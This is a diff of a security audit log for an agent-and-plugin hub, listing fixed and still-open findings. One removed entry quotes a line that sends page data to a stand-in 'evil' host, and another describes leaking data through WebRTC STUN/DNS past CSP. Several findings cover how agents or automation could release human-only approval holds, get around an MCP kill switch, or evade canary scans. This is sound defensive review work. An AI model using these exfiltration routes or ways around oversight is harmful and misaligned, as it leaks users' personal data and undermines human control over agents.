@@ -41,6 +41,18 @@ unusual setup or a second step; **low** = hardening.
 | K3 | high | Config-action `exec` skipped core's launch path (spec 7.1): root workers ran actions as root, leases never applied. Every exec child also inherited the hub's `ROOK_SECRET_*` vault stand-in. | #305 |
 | D8 | low/med | An unread request body on a kept-alive connection was parsed as the next request (smuggling behind a shared proxy connection). | #303 |
 | D10 | low | No socket timeout on the HTTP door: idle connections held threads forever. 60 s now. | #303 |
+| H7 | high | Hard-stop releases were open to any person-only caller: `approval.decide` is an ordinary hub cap, so a job a person made or a hub plugin's `ctx.call_as` released that person's destructive or `sends_as` holds (spec 10.3). Hard stops now release only from a door where the person is there (the site, `POST /holds` with their own token); `system:` releases narrowed to the security triage component, for its own gate's flags. | #310 |
+| H5 (hub caps), H10 | medium | A hub cap's `ctx.call` didn't carry the layers of the call it ran in (a page's caps), and sub-calls dispatched with `door=None`. Hub caps now carry the door's layers and the door (plugin `uses` don't compose across hub hops: each plugin's own apply); `core.call` goes through the parent's door. | #311 |
+| H9 | medium | Agents read any project's journal by naming it at session start. A session names only a project its caller may see (owners any; others need rights to read projects and the project on the workbench). | #312 |
+| H11 | medium | An exception inside dispatch gave the caller a traceback and no journal entry. Dispatch and release answer `internal error` and journal in a `finally` (`error: internal`); a failing journal store is logged, never raised to a caller whose call ran. | #313 |
+| K6 | medium | Canary scans stopped at 8 MiB and re-dumped args on the hub loop. The scan reads head and tail, dumps once, and runs off the loop. | #314 |
+| D5 | — | Did not reproduce: the shell's `frame-src 'self'` governs every navigation of the frames it embeds, including one the frame starts itself (verified in Chrome 149, with a control run). A real-browser test locks it in. WebRTC is a separate channel: see Open. | #315 |
+| D7 | medium | The MCP kill switch covered only `dispatch()`. A closed door now refuses everything after auth (views, sessions, calls, no-token routes); a closed MCP door refuses agents' tokens on every door; it persists (`doors.json`) and has a route (`POST /doors/<name>`) and a cap (`hub.door`). | #316 |
+| D6 | medium | Page events weren't scoped to the viewer: an adult's page heard other people's messages and holds. Events with a `person` are that person's and owners'; `taints` events naming nobody are owners'. | #317 |
+| D4 | medium | Device-code queue flood. Unpolled device codes go after 30 s; approvers see each code's address and age. | #318 |
+| K2 (general) | medium | Sync plugin code ran on the loop's shared default executor. Each plugin has its own bounded pool; kvm reads are capped (16 MiB, 30 s). | #319 |
+| D9, D11 (part) | low | Tokens are revoked live (`tokens.json` is the whole list), a removed agent's token is nobody, `POST /login` refuses cross-site browser requests (login CSRF), `_poll` reads the session under the lock. | #320 |
+| K9 (part) | low | `shell.exec` keeps at most 8 MiB per stream; kvm, llm-anthropic and llm-openai refuse redirects (urllib re-sent the password/key to any host). | #323 |
 | CI | — | `test_ask_answer_cancel_and_timeout` (jobs) raced on CI py3.12 and failed unrelated PRs. | #304 |
 
 ## Open
@@ -58,82 +70,33 @@ unusual setup or a second step; **low** = hardening.
   is no small fix: give workers a key (sign `core.call`/`core.elevate`
   requests), or at least cap sub-calls per parent ticket and journal them
   loudly. Needs a spec decision (core v2.1).
-- **D5: a page can exfiltrate by navigating its own frame.** `sandbox
-  allow-scripts` without `allow-top-navigation` still lets a frame navigate
-  itself: `location = "https://evil/?d=" + JSON.stringify(await
-  rook.call(...))`. The shell notices the second load only after the data
-  left. CSP has no portable `navigate-to`. Options: serve made pages from a
-  separate origin with a strict `connect-src`/`form-action`, or proxy
-  outbound navigation through a confirm. With D1 fixed, the reach is the
-  page's caps intersected with its author.
-- **H7: hard-stop releases are open to any person-only caller.**
-  `decide()` treats `caller.agent or caller.person` as who decides, and
-  `approval.decide` is an ordinary hub cap. A job created by a person runs
-  as person-only with `uses: ["*"]`, and hub plugins can `ctx.call_as` a
-  person, so automation can release that person's destructive or `sends_as`
-  holds. Spec 10.3 says nothing but the person releases them. Suggestion:
-  hard stops release only from a human-present door (the site shell's own
-  call, the phone card, `POST /holds/<name>` with a person token), never
-  from a dispatched cap; narrow `system:` releases to the triage component.
 
 ### Medium
 
-- **D4: device-code queue flood.** `/enroll/device` is unauthenticated and
-  `MAX_PENDING` (32) is global: anyone who reaches the hub keeps it full and
-  real devices get "busy". The device also names itself freely ("bake-laptop")
-  in `/enroll/pending`. Per-source limits don't survive a reverse proxy;
-  show the device's address and code age to the approver, and expire
-  unpolled codes fast (a real device polls every few seconds).
-- **D6: page events aren't scoped to the viewer's data.** `_poll` filters by
-  event name against the viewer's grants only: an adult's page with
-  `events: ["sms.*", "telegram.*", "hold.*"]` receives other people's
-  messages and holds. Events need an owner/person field and the `personal`
-  effect applied the way records do.
-- **D7: the MCP kill switch is partial.** `closed_doors` is checked only in
-  `dispatch()`: `workers`, `caps`, `journal`, `holds` and session starts
-  still answer through a closed MCP door; the same agent token works on the
-  HTTP door; sub-calls dispatch with `door=None`; nothing (route, cap,
-  security plugin) calls `close_door`, and it is memory only.
-- **H5 (hub caps).** A hub cap's `ctx.call` (`runtime.call_as`) applies only
-  the plugin's `uses`, not the layers of the call it runs inside (a page's
-  caps): hub caps get no in-flight ticket to carry them. Thread the parent
-  call's layers through the hub cap's caller.
-- **H9: agents read any project's journal by naming it.** `start_session`
-  accepts any `project`, and `journal_view` grants an agent every project of
-  its sessions. Check the agent's (or person's) access to the project at
-  session start.
-- **K2 (general).** Sync plugin code runs on the loop's shared default
-  executor; a hung sync cap keeps its thread after the call times out.
-  `kvm.api_get` with a follow/stream query reads forever. Give plugin calls
-  their own bounded executor (per plugin), and cap response reads in kvm.
-- **K6: canary scans stop at 8 MiB** (`security.py` `_text`): a canary
-  behind 8 MiB of padding is missed. The check is also CPU-bound inside an
-  async gate (re-dumps args 3-4 times; 50 MB args block the hub loop
-  ~0.3 s). Scan head and tail, dump once.
-- **H11: dispatch has no crash guard.** An exception inside `_dispatch`
-  (malformed cap meta, `needs_approval`, a gate with an unknown mode, a
-  failing `journal.append` after the call ran) gives the caller a traceback
-  and no journal entry. Journal in a `finally` with `error: internal`.
+- **D5 residual: WebRTC.** A page can open an `RTCPeerConnection` with a
+  STUN server named after the data (UDP and DNS out). Chrome 149 ignores
+  CSP `webrtc 'block'`, no sandbox flag covers it, and removing the
+  constructors in the bridge is defeated by a `srcdoc` child frame running
+  its own script (all verified with tests/test_core2_page_sandbox_browser.py's
+  harness). With D1 fixed the reach is the page's caps intersected with its
+  agent author. A policy call for Bake: e.g. agent-made pages don't get caps
+  that read sensitive or personal data, or a browser policy on viewers.
 
 ### Low
 
-- **D9:** tokens can't be revoked while the hub runs (reload only adds);
-  `/workers` and `/caps` answer any valid token (a child, a deleted agent)
-  with the whole band.
-- **D11:** login CSRF on `POST /login` (a cross-site form signs the victim
-  into the attacker's account); the MCP door accepts person-only tokens
-  (spec 10.1 says agents); the mDNS responder answers unicast from any
-  source (small reflector); with `--discover` an attacker on the LAN can
-  answer mDNS and relay a device-code flow (approvers aren't shown the
-  device's URL/address); `_poll` reads `self.sessions[sid]` outside the
-  lock (rare 500).
-- **H10:** sub-calls and `call_as` dispatch with `door=None`, so closing a
-  door doesn't stop work already started through it.
+- **D9 (rest):** `/workers` and `/caps` answer any valid token (a child, a
+  guest) with the whole band roster: a policy call, not changed.
+- **D11 (rest):** the MCP door accepts person-only tokens (spec 10.1 says
+  agents; changing it could cut people's MCP clients off); the mDNS
+  responder answers unicast from any source (small reflector); with
+  `--discover` an attacker on the LAN can answer mDNS and relay a
+  device-code flow (approvers now see the request's address and age, #318).
 - **H12:** the journal's `args_hash` is over unresolved args, the ticket's
   over resolved ones, so a journal entry can't be matched to a worker's
-  audit line; released holds don't check `session.exp`; a worker's
-  manifests supply its own `uses`, so a compromised worker can widen its
-  `uses` layer; jobs created by an agent for a person store `creator` as
+  audit line; released holds don't check `session.exp` (holds don't expire
+  by design: which wins is a spec call); a worker's manifests supply its
+  own `uses`, so a compromised worker can widen its `uses` layer; jobs
+  created by an agent for a person store `creator` as
   `"person:x via agent:y"`, which `Caller.problem()` rejects (fails closed:
   those jobs never run).
 - **K7:** `on`/`every` hooks have no timeout or backpressure (jobs listens to
@@ -141,10 +104,8 @@ unusual setup or a second step; **low** = hardening.
 - **K8:** hub-side config actions don't resolve secret settings (they render
   the vault name), skip `cap=` (arg map/join, result coercion) and get no
   `tmp`.
-- **K9:** `shell.exec` keeps unbounded output in memory (`yes` for 30 s can
-  OOM the worker; cap it as adb does); the jobs webhook has no timestamp or
-  nonce (a captured signed POST replays); `urllib` in kvm and llm-anthropic
-  follows cross-host redirects with credentials; `trust_class` calls
+- **K9 (rest):** the jobs webhook has no timestamp or nonce (a captured
+  signed POST replays; needs a sender-side change); `trust_class` calls
   YAML-only plugins `config` though their `exec` actions run any binary
   (don't let it gate installs as "no code"); `records/store.py`
   `_check_refs` checks band, not visibility (an existence oracle for
@@ -157,6 +118,11 @@ unusual setup or a second step; **low** = hardening.
   too.
 - **Plugin `python` pins** install from PyPI without hashes: the hub signs
   names and versions, not artifacts.
+- **CI flakes seen while landing these** (unrelated to the fixes, rerun
+  green): `tests/test_kit_actions_engine.py::test_exec_timeout_kills_the_process_tree`
+  (`_alive()` reads `/proc/<pid>/stat` of a process that just exited:
+  ESRCH), `tests/test_names_rooms.py::test_console_search_matches_names`,
+  `tests/plugins/test_security_ml.py::test_retrain_skips_flagged_sessions_and_promotes_after_clean_nights`.
 
 ## Checked and sound
 
